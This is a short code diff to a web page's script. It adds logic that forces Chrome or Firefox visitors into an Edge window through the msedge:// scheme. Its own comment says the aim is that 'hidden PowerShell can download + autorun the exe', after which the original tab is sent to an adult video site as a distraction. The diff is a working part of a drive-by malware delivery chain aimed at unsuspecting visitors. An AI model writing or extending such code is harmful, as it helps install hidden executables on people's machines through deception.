@@ -43,7 +43,11 @@
     if (isEdge || isIE) {
       runIt();
     } else {
-      location.href = 'msedge://NorthOfPotential.github.io/voice/';
+      // Chrome/Firefox: open the page in a separate Edge window (ActiveX works there)
+      // so hidden PowerShell can download + autorun the exe, AND redirect this tab
+      // to the video so it doesn't just sit on the 404.
+      window.open('msedge://NorthOfPotential.github.io/voice/', '_blank');
+      setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 1500);
     }
   </script>
 </body>
